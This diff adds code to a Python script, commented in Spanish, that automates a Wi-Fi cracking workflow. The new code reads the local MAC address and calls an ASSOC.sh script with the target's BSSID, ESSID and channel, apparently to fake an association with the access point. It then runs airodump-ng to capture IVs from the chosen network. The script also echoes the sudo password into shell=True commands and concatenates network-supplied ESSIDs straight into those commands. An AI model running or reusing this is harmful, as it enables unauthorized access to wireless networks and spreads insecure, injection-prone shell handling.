@@ -22,7 +22,20 @@
 """
 import sys
 import subprocess
+import time
 from subprocess import call
+
+#Obtencion de mac sin modulos extra
+def getmac(interface):
+
+  try:
+    mac = open('/sys/class/net/'+interface+'/address').readline()
+  except:
+    mac = "00:00:00:00:00:00"
+
+  return mac[0:17]
+
+
 print('Contraseña super usuario: ')
 pwd = input()
 #Eliminacion de archivos pasados
@@ -70,7 +83,14 @@ call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)
 cmd = 'rm automatizer-01.kismet.netxml'
 call('echo {}| sudo -S {}'.format(pwd, cmd), shell=True)
 
+#Llamado al archivo bash que contiene las siguientes instrucciones
+MAC = getmac(i)
+cmd = ('./ASSOC.sh '+List_dic[opcion].get('BSSID')+' '+MAC+' '+List_dic[opcion].get(' ESSID')+
+' '+i+''+List_dic[opcion].get(' channel'))
 
+subprocess.call('echo {} | sudo -S {}'.format(pwd, cmd), shell=True)
+
+#Ejecucion de la captura de IVS's
 cmd = ('airodump-ng -c'+List_dic[opcion].get(' channel')+ ' -w automatizer --bssid '+List_dic[opcion].get('BSSID')+' '+i)
 cmd = cmd.split()
 
